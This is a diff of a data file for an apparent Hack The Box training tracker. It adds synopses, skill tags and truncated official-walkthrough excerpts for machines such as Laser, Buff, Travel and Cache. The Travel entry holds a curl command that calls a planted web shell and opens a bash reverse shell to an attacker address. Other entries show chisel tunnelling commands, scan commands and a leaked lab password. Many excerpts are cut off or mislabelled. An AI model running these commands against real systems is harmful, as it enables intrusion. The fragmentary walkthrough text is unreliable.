+    "hint": "Laser is an insane difficulty Linux machine that features an exposed printer. The service is queried for information and used to decrypt a file that is present in the print queue.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-08-08T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Laser is an insane difficulty Linux machine that features an exposed printer. The service is queried for information and used to decrypt a file that is present in the print queue. This gives access to sensitive information that is leveraged to perform a Server Side Request Forgery (SSRF). Leveraging the Server Side Request Forgery, an outdated Apache Solr instance is exploited in order to gain a foothold. A race condition is then exploited, which allows for lateral movement to a container. The container is used to redirect SSH connections, finally giving root access.",
+    "skillsLearned": [
+      "Printer"
+    ],
+    "officialPdf": "269-Laser_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLaser is an insane difficulty Linux machine that features an exposed printer. The service is queried for information and used to decrypt a file that is present in the print queue. This gives access to sensitive information that is leveraged to perform a Server Side Request Forgery (SSRF). Leveraging the Server Side Request Forgery, an outdated Apache Solr instance is exploited in order to gain a foothold. A race condition is then exploited, which allows for lateral movement to a container. The container is used to redirect SSH connections, finally giving root access.\n\n### 🎯 Core Skills\n- **Printer**\n\n### ⚔️ Foothold Vector\n. A race condition is then exploited, which allows for lateral movement to a container. The container is used to redirect SSH connections, finally giving\n\n### 👑 Privilege Escalation\naccess. Skills Required Enumeration Scripting Programming in C Skills Learned Printer Exploitation gRPC & Protobuf Race Conditions SSH Redirection Enumeration Nmap The Nmap scan reveals three open ports, with SSH available on the default port 22. Ports 9000 and 9100 are unidentified. According to speedguide, this port is commonly used by printers in order to handle print jobs. Let's try to enumerate the service and see if we can retrieve information without authentication. PRET A quick search about tools related to printers leads us to PRET. Let's set it up and try interacting with the service. The tool allows for communicating in three languages i.e."
   },
   {
     "id": "htb-unbalanced",
@@ -7791,15 +8998,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Blind-XPATH-Injection",
+      "HTB",
+      "hole"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/unbalanced",
     "writeupUrl": "https://0xdf.gitlab.io/tags#unbalanced",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Unbalanced is a hard difficulty Linux machine featuring a rsync service that stores an encrypted backup module. Upon decryption we find Squid proxy configuration details, which allow us to access internal hosts.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-08-01T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Unbalanced is a hard difficulty Linux machine featuring a rsync service that stores an encrypted backup module. Upon decryption we find Squid proxy configuration details, which allow us to access internal hosts. One of the hosts is found vulnerable to a blind XPath injection, which is leveraged to obtain a set of credentials. These credentials allows us to gain foothold on the server. A vulnerable Pi-hole Docker instance is discovered, which is exploited and allows us to obtain a password that can be reused for the root account.",
+    "skillsLearned": [
+      "Blind XPATH Injection",
+      "hole"
+    ],
+    "officialPdf": "268-Unbalanced_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nUnbalanced is a hard difficulty Linux machine featuring a rsync service that stores an encrypted backup module. Upon decryption we find Squid proxy configuration details, which allow us to access internal hosts. One of the hosts is found vulnerable to a blind XPath injection, which is leveraged to obtain a set of credentials. These credentials allows us to gain foothold on the server. A vulnerable Pi-hole Docker instance is discovered, which is exploited and allows us to obtain a password that can be reused for the root account.\n\n### 🎯 Core Skills\n- **Blind XPATH Injection**\n- **hole**\n\n### ⚔️ Foothold Vector\non the server. A vulnerable Pi-hole Docker instance is discovered, which is exploited and allows us to obtain a password that can be reused for the\n\n### 👑 Privilege Escalation\naccount. Skills Required Enumeration OWASP Top 10 Python/Bash Scripting Skills Learned Blind XPATH Injection Pi-hole Exploitation Enumeration Nmap Nmap output reveals that the target server has ports 22 (OpenSSH), 873 (rsync) and 3128 (Squid http proxy) available. rsync Let's attempt to retrieve a list of modules using the rsync command line utility. The conf_backups folder is available. The description states that it's an EncFS-encrypted backups folder. Let's view the files inside the conf_backups folder. ports=$(nmap -p- --min-rate=1000 -T4 10.129.24.223 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.129.24.223 The directory is encrypted."
   },
   {
     "id": "htb-openkeys",
@@ -7810,15 +9026,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CVE-2019-19520",
+      "CVE-2019-19521",
+      "CVE-2019-19522",
+      "Code-Auditing",
+      "Exploiting-xlock",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/openkeys",
     "writeupUrl": "https://0xdf.gitlab.io/tags#openkeys",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "OpenKeyS is a medium difficulty OpenBSD machine that features a web server on port 80.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-07-25T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "OpenKeyS is a medium difficulty OpenBSD machine that features a web server on port 80.",
+    "skillsLearned": [
+      "Code Auditing",
+      "Exploiting the OpenBSD Authentication Framework",
+      "Exploiting xlock",
+      "Exploiting S/Key Authentication"
+    ],
+    "officialPdf": "267-OpenKeyS_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOpenKeyS is a medium difficulty OpenBSD machine that features a web server on port 80.\n\n### 🎯 Core Skills\n- **Code Auditing**\n- **Exploiting the OpenBSD Authentication Framework**\n- **Exploiting xlock**\n- **Exploiting S/Key Authentication**\n\n### 🛡️ Associated CVEs\n`CVE-2019-19520`, `CVE-2019-19521`, `CVE-2019-19522`\n\n### ⚔️ Foothold Vector\nthe login page is bypassed. Due to insecure PHP coding, it is possible to set the username to Jennifer through the usage of cookies, and acquire SSH credentials. Enumeration of the server confirms the OS version in use to be 6.6 which is vulnerable to a\n\n### 👑 Privilege Escalation\nexploit. Attackers can leverage the file /usr/X11R6/bin/xlock to become a member of the auth group, after which they can leverage the S/Key authentication option to add an entry for the root user and escalate their privileges. Skills Required Enumeration Knowledge of the PHP Framework Skills Learned Code Auditing Exploiting the OpenBSD Authentication Framework Exploiting xlock Exploiting S/Key Authentication Enumeration Nmap Let's begin by running an Nmap scan. The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. It's also revealed that the underlying OS is OpenBSD. Let's check out the website in a browser. Accessing http://10.10.10.99 redirects us to /index.php and a login page."
   },
   {
     "id": "htb-buff",
@@ -7829,15 +9059,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Buffer-Overflow",
+      "HTB",
+      "Port-Forwarding",
+      "Unauthenticated-RCE"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/buff",
     "writeupUrl": "https://0xdf.gitlab.io/tags#buff",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Buff is an easy difficulty Windows machine that features an instance of Gym Management System 1.0. This is found to suffer from an unauthenticated remote code execution vulnerability.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-07-18T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Buff is an easy difficulty Windows machine that features an instance of Gym Management System 1.0. This is found to suffer from an unauthenticated remote code execution vulnerability.",
+    "skillsLearned": [
+      "Unauthenticated RCE",
+      "Buffer Overflow",
+      "Port Forwarding"
+    ],
+    "officialPdf": "263-Buff_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBuff is an easy difficulty Windows machine that features an instance of Gym Management System 1.0. This is found to suffer from an unauthenticated remote code execution vulnerability.\n\n### 🎯 Core Skills\n- **Unauthenticated RCE**\n- **Buffer Overflow**\n- **Port Forwarding**\n\n### ⚔️ Foothold Vector\nWe know that the web application is running Gym Management Software 1.0. Searching for known issues for this application reveals an unauthenticated file upload vulnerability, which allows attackers to gain RCE. We can download Gym Management Software from here. Let's take a look at source code to understand how it works. Accord to public analysis on this application, the vulnerability exists in upload.php because the application doesn't check if the user is authenticated. Looking at the source code of upload.php , we see that it takes in the GET parameter id and assigns the value to a variable user.\n\n### 👑 Privilege Escalation\nSearching online for \"Cloud Me\" version 1112 returns this Exploit-DB exploit. Inspection reveals that it's a buffer overflow exploit (see Appendix A for the code listing). As the service listens on localhost, we can make this port available to our machine using a SOCKS proxy. To accomplish this, we can use Chisel. First, set up the Chisel server on our attacking machine, listening on port 9999. We can download Chisel for Windows and upload it to the target machine so we can tunnel port 8080 to our system. We confirm that the tunnel was successfully established. Let's use msfvenom to generate shellcode. ./chisel server -p 9999 --reverse chisel.exe client 10.10.14.2:9999 R:8888:127.0.0."
   },
   {
     "id": "htb-intense",
@@ -7848,15 +9089,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Binary",
+      "HTB",
+      "Length-Extension-Attack",
+      "SNMP-RCE",
+      "SQLite-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/intense",
     "writeupUrl": "https://0xdf.gitlab.io/tags#intense",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Intense is a hard difficulty Linux machine that features an open-source Flask application. Source code review reveals a SQL injection vulnerability, which is used to gain the administrator's password hash.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-07-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Intense is a hard difficulty Linux machine that features an open-source Flask application. Source code review reveals a SQL injection vulnerability, which is used to gain the administrator's password hash. This hash is used to perform a hash length extension attack in order to login as the administrator. A path traversal vulnerability is used to read SNMP configuration leading to command execution on the server. Finally, a custom note server is exploited to perform a ROP and gain a root shell.",
+    "skillsLearned": [
+      "Length Extension Attack",
+      "SQLite Injection",
+      "SNMP RCE",
+      "Binary"
+    ],
+    "officialPdf": "261-Intense_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nIntense is a hard difficulty Linux machine that features an open-source Flask application. Source code review reveals a SQL injection vulnerability, which is used to gain the administrator's password hash. This hash is used to perform a hash length extension attack in order to login as the administrator. A path traversal vulnerability is used to read SNMP configuration leading to command execution on the server. Finally, a custom note server is exploited to perform a ROP and gain a root shell.\n\n### 🎯 Core Skills\n- **Length Extension Attack**\n- **SQLite Injection**\n- **SNMP RCE**\n- **Binary**\n\n### ⚔️ Foothold Vector\nEnumeration Nmap Nmap output reveals OpenSSH and Nginx servers running on their default ports. Nginx Browsing to the website provides us with some useful information. It allows logging in to the website with guest credentials. Additionally, the footer states that the application is open source. Let's download it. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.195 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.195 The website seems to be a flask application with SQLite as the backend database. There's also a special route for the admin user. Looking at the app.py file, we see an interesting route.\n\n### 👑 Privilege Escalation\nshell. Skills Required Source Code Review Scripting Skills Learned Length Extension Attack SQLite Injection SNMP RCE Binary Exploitation Enumeration Nmap Nmap output reveals OpenSSH and Nginx servers running on their default ports. Nginx Browsing to the website provides us with some useful information. It allows logging in to the website with guest credentials. Additionally, the footer states that the application is open source. Let's download it. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.195 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.195 The website seems to be a flask application with SQLite as the backend database."
   },
   {
     "id": "htb-ropetwo",
@@ -7867,15 +9121,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Heap",
+      "V8-Exploit-Development"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ropetwo",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ropetwo",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "RopeTwo is an insane difficulty Linux machine that showcases a variety of exploit development concepts. The foothold requires analysis of a patch for the V8 JavaScript engine in order to get a shell.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-06-27T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "RopeTwo is an insane difficulty Linux machine that showcases a variety of exploit development concepts. The foothold requires analysis of a patch for the V8 JavaScript engine in order to get a shell. A SUID binary suffering from improper memory handling is then leveraged to get a user shell. Finally, a vulnerable Linux Kernel Module is used to escalate privileges and execute code as root.",
+    "skillsLearned": [
+      "V8 Exploit Development",
+      "Heap"
+    ],
+    "officialPdf": "260-RopeTwo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRopeTwo is an insane difficulty Linux machine that showcases a variety of exploit development concepts. The foothold requires analysis of a patch for the V8 JavaScript engine in order to get a shell. A SUID binary suffering from improper memory handling is then leveraged to get a user shell. Finally, a vulnerable Linux Kernel Module is used to escalate privileges and execute code as root.\n\n### 🎯 Core Skills\n- **V8 Exploit Development**\n- **Heap**\n\n### ⚔️ Foothold Vector\nrequires analysis of a patch for the V8 JavaScript engine in order to get a shell. A SUID binary suffering from improper memory handling is then leveraged to get a user shell. Finally, a vulnerable Linux Kernel Module is used to escalate privileges and execute code as\n\n### 👑 Privilege Escalation\n. Skills Required Reverse Engineering Exploit Development Scripting Linux Heap Internals C Programming JavaScript Skills Learned V8 Exploit Development Heap Exploitation Linux Driver & Kernel Exploitation Enumeration Nmap Nmap reveals four open ports, corresponding to the services SSH (22), Nginx (5000 & 8060) and Werkzeug (8000). According to Nmap, the server on port 5000 appears to be running GitLab. Werkzeug Let's check out the server running on port 8000. The website appears to be associated with V8 development. V8 is an open-source JavaScript engine that powers applications such as Google Chrome and languages such as NodeJS. The website also contains a hyperlink pointing to gitlab."
   },
   {
     "id": "htb-tabby",
@@ -7886,15 +9149,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "LXD-Abuse",
+      "ZIP-Cracking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/tabby",
     "writeupUrl": "https://0xdf.gitlab.io/tags#tabby",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Tabby is a easy difficulty Linux machine.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-06-20T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Tabby is a easy difficulty Linux machine.",
+    "skillsLearned": [
+      "Tomcat Text Interface WAR File Upload",
+      "ZIP Cracking",
+      "LXD Abuse"
+    ],
+    "officialPdf": "259-Tabby_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTabby is a easy difficulty Linux machine.\n\n### 🎯 Core Skills\n- **Tomcat Text Interface WAR File Upload**\n- **ZIP Cracking**\n- **LXD Abuse**\n\n### ⚔️ Foothold Vector\nLet's scan this URL and see if there are any files or directories hosted there. Wfuzz reveals the above directories. We can search online for the /manager/text interface. This returns Tomcat's official documentation, which states that commands can be executed through this interface. wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.194:8080/manager/FUZZ As the Tomcat user is assigned the manager-script role, we should be permitted to interact with /manager/text . Let's try listing the available hosts on Tomcat. This is successful. It is also well-known that Tomcat deploys Java web applications. Let's check if we can deploy a project using the text interface.\n\n### 👑 Privilege Escalation\nby creating a privileged container, into which the host's filesystem is mounted. Eventually, access to the remote machine is gained as root using SSH. Skills Required Web Enumeration Linux Enumeration Skills Learned Tomcat Text Interface WAR File Upload ZIP Cracking LXD Abuse Enumeration Nmap output reveals that this is a Ubuntu server, running SSH, Apache and Tomcat on their default ports. Let's enumerate the website titled \"Mega Hosting\". This a website for a company that provides hosting services. Having a closer at the website, there is a link stating that the company has recently recovered from a data breach. The link points to http://megahosting.htb/news.php?file=statement ."
   },
   {
     "id": "htb-fuse",
@@ -7905,15 +9178,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Printer"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fuse",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fuse",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Fuse is a medium difficulty Windows box made that starts with",
     "timeSpentSeconds": 0,
     "createdAt": "2020-06-13T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Fuse is a medium difficulty Windows box made that starts with",
+    "skillsLearned": [
+      "Printer"
+    ],
+    "officialPdf": "256-Fuse_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFuse is a medium difficulty Windows box made that starts with\n\n### 🎯 Core Skills\n- **Printer**\n\n### ⚔️ Foothold Vector\nwe can abuse the SeLoadDriver privilege and get a shell as SYSTEM. Skills Required Basic Windows Knowledge Skills Learned Printer Enumeration Reset Expired Passwords SeLoadDriver Privilege Abuse Password Spraying Enumeration Nmap reveals that we are looking at a Domain Controller (DC) for the fabricorp.local domain. Apart from the standard ports exposed by domain controllers, we note that ports 5985 (Windows Remote Management) and 80 (Internet Information Services) are available. The server version is Windows Server 2016 and the OS Build is 14393. Navigating to port 80 in the browser results in a redirect to the URL below. We can add the DC as a name server in /etc/resolv.\n\n### 👑 Privilege Escalation\nThe whoami /groups command reveals that we are a member of the Print Operators group. Membership of this group bestows the SeLoadDriver privilege on its members. The command whoami /priv reveals that this privilege is already enabled in our logon token. We can get a better understanding of the SeLoadDriver privilege by reading this post by Microsoft which describes the vulnerability and impact associated with this privilege: So far we know that we have the ability to load drivers. However, a quick Google search of this exploitation vector reveals a Tarlogic Security post that shows how a vulnerable driver can be loaded, which can be leveraged to get RCE."
   },
   {
     "id": "htb-blunder",
@@ -7924,15 +9204,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Bludit-CMS",
+      "CVE-2019-14287",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/blunder",
     "writeupUrl": "https://0xdf.gitlab.io/tags#blunder",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Blunder is an Easy difficulty Linux machine that features a Bludit CMS instance running on port 80. The website contains various facts about different genres.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-05-30T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Blunder is an Easy difficulty Linux machine that features a Bludit CMS instance running on port 80. The website contains various facts about different genres. Using GoBuster, we identify a text file that hints to the existence of user fergus , as well as an admin login page that is protected against brute force. An exploit that bypasses the brute force protection is identified, and a dictionary attack is run against the login form. This attack grants us access to the admin panel as fergus .",
+    "skillsLearned": [
+      "Bludit CMS"
+    ],
+    "officialPdf": "254-Blunder_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBlunder is an Easy difficulty Linux machine that features a Bludit CMS instance running on port 80. The website contains various facts about different genres. Using GoBuster, we identify a text file that hints to the existence of user fergus , as well as an admin login page that is protected against brute force. An exploit that bypasses the brute force protection is identified, and a dictionary attack is run against the login form. This attack grants us access to the admin panel as fergus .\n\n### 🎯 Core Skills\n- **Bludit CMS**\n\n### 🛡️ Associated CVEs\n`CVE-2019-14287`\n\n### 👑 Privilege Escalation\nusing sudo . The sudo binary is identified to be outdated, and vulnerable to CVE-2019-14287. Successful exploitation of this vulnerability returns a root shell. Skills Required Enumeration Metasploit Skills Learned Bludit CMS Exploitation Sudo Exploitation Enumeration Nmap The scan reveals ports 21 (FTP) and 80 (Apache) to be open. The website on port 80 consists of facts on various subjects. The FTP server on port 21 refuses connections. GoBuster Let's use GoBuster to search for files and folders hosted on the web server. Some common extensions to try are .php , .txt and .pdf . ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-dyplesher",
@@ -7943,15 +9231,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "AMQP",
+      "Cuberite",
+      "HTB",
+      "Password-Cracking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/dyplesher",
     "writeupUrl": "https://0xdf.gitlab.io/tags#dyplesher",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Dyplesher is an insane difficulty Linux machine featuring multiple technologies and vulnerabilities. Vhost",
     "timeSpentSeconds": 0,
     "createdAt": "2020-05-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Dyplesher is an insane difficulty Linux machine featuring multiple technologies and vulnerabilities. Vhost",
+    "skillsLearned": [
+      "Password Cracking",
+      "Minecraft Plugin Creation",
+      "AMQP",
+      "Cuberite"
+    ],
+    "officialPdf": "253-Dyplesher_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDyplesher is an insane difficulty Linux machine featuring multiple technologies and vulnerabilities. Vhost\n\n### 🎯 Core Skills\n- **Password Cracking**\n- **Minecraft Plugin Creation**\n- **AMQP**\n- **Cuberite**\n\n### ⚔️ Foothold Vector\ncan be gained by uploading a Minecraft plugin. Credentials found in a network capture can be used to escalate to another user. Publishing a Cuberite plugin over the AMQP protocol leads to a\n\n### 👑 Privilege Escalation\nshell. Skills Required Web Enumeration Programming Scripting Skills Learned Password Cracking Minecraft Plugin Creation AMQP Cuberite Enumeration Nmap Nmap output reveals that the target server has ports 22 (OpenSSH), 80 (Apache), 3000 (ppp?), 4369 (Erlang Port Mapper), 5672 (RabbitMQ), 11211 (Memcache) and 25565 (Minecraft) open. Apache The application hosted on Apache refers to a Minecraft Server and displays its status and hostname. Let's add the hostnames to the /etc/hosts file. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.190 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.190 The STAFF page reveals 3 different usernames."
   },
   {
     "id": "htb-travel",
@@ -7962,15 +9262,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Editing-LDAP-Attributes",
+      "HTB",
+      "Memcached",
+      "PHP-Deserialization",
+      "SSRF"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/travel",
     "writeupUrl": "https://0xdf.gitlab.io/tags#travel",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Travel is a hard difficulty Linux machine that features a WordPress instance along with a development server. The server is found to host an exposed Git repository, which reveals sensitive source code.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-05-16T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Travel is a hard difficulty Linux machine that features a WordPress instance along with a development server. The server is found to host an exposed Git repository, which reveals sensitive source code. The source code is analyzed and an SSRF and unsafe deserialization vulnerability are identified. These are leveraged to gain code execution. A backup password is cracked and used to move laterally. The user is found to be an LDAP administrator and can edit user attributes. This is leveraged to modify group membership and gain root privileges.",
+    "skillsLearned": [
+      "SSRF",
+      "Memcached",
+      "PHP Deserialization",
+      "Editing LDAP Attributes"
+    ],
+    "officialPdf": "252-Travel_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTravel is a hard difficulty Linux machine that features a WordPress instance along with a development server. The server is found to host an exposed Git repository, which reveals sensitive source code. The source code is analyzed and an SSRF and unsafe deserialization vulnerability are identified. These are leveraged to gain code execution. A backup password is cracked and used to move laterally. The user is found to be an LDAP administrator and can edit user attributes. This is leveraged to modify group membership and gain root privileges.\n\n### 🎯 Core Skills\n- **SSRF**\n- **Memcached**\n- **PHP Deserialization**\n- **Editing LDAP Attributes**\n\n### ⚔️ Foothold Vector\nSubmit the URL above to poison the memcached key and then browse to http://blog.travel.htb/awesome-rss/ to request feeds. This time we should see an empty response, indicating that our payload was retrieved. Browsing to http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php? 0=id should return the output below, confirming that we've achieved command execution on the underlying server. A reverse shell can be gained by executing the following command: curl -G http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php -- data-urlencode '0=bash -c \"bash -i >& /dev/tcp/10.10.14.\n\n### 👑 Privilege Escalation\nprivileges. Skills Required Web Enumeration PHP Code Review LDAP Skills Learned SSRF Memcached PHP Deserialization Editing LDAP Attributes Enumeration Nmap Nmap reports two services - SSH (port 22), and an Nginx HTTP server available on ports 80 and 443. Additionally, the script scan also revealed three interesting vhost entries in the SSL certificate. Let's add them to the hosts file. Nginx The main vhost features a static website. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.189 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.189 10.10.10.189 travel.htb www.travel.htb blog.travel.htb blog-dev.travel."
   },
   {
     "id": "htb-cache",
@@ -7981,15 +9294,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Basic-SQL-Injection",
+      "HTB",
+      "Memcached"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/cache",
     "writeupUrl": "https://0xdf.gitlab.io/tags#cache",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Cache is a medium difficulty Linux machine.",
     "timeSpentSeconds": 0,
     "createdAt": "2020-05-09T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Cache is a medium difficulty Linux machine.",
+    "skillsLearned": [
+      "Basic SQL Injection",
+      "Memcached"
+    ],
+    "officialPdf": "251-Cache_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCache is a medium difficulty Linux machine.\n\n### 🎯 Core Skills\n- **Basic SQL Injection**\n- **Memcached**\n\n### ⚔️ Foothold Vector\nMethod 1 Further enumeration of the web application reveals a vector for remote command execution. After navigating to http://hms.htb/interface/super/manage_site_files.php , it's found that we can edit an existing PHP file. Let's edit the /letter_templates/custom_pdf.php file, back up the contents and replace the contents with a basic PHP webshell. Navigate to the URL and add the following. Next, click on the Save button and browse to the following path, as the Edit Path title indicates. We have successfully achieved command execution as www-data . Method 2 the file super/manage_site_files.php also contains an unrestricted file upload vulnerability .\n\n### 👑 Privilege Escalation\n, from within a docker container. Skills Required Web Enumeration Linux Enumeration Skills Learned Basic SQL Injection Memcached Enumeration Docker Abuse Enumeration Nmap Nmap output reveals Apache and SSH servers running on their default ports. The website contains a news page, a page displaying information about the author, as well as a contact and login form. After clicking Login , inspection of the login.html source code reveals the file jquery/functionality.js . This file is found to contain the password H@v3_fun for the user ash . ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.188 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10."
   },
   {
     "id": "htb-admirer",
@@ -8000,15 +9322,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Python-Library-Hijacking"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/admirer",
     "writeupUrl": "https://0xdf.gitlab.io/tags#admirer",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Admirer is an easy difficulty Linux machine that features a vulnerable version of Adminer (caused by an underlying MySQL protocol flaw), and an interesting Python library hijacking vector. After thorough",
     "timeSpentSeconds": 0,
     "createdAt": "2020-05-02T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Admirer is an easy difficulty Linux machine that features a vulnerable version of Adminer (caused by an underlying MySQL protocol flaw), and an interesting Python library hijacking vector. After thorough",
+    "skillsLearned": [
+      "Exploiting MySQL Arbitrary File Read via Adminer",
+      "Python Library Hijacking"
+    ],
+    "officialPdf": "248-Admirer_HTB_Official_writeup_Tamarisk.pdf",
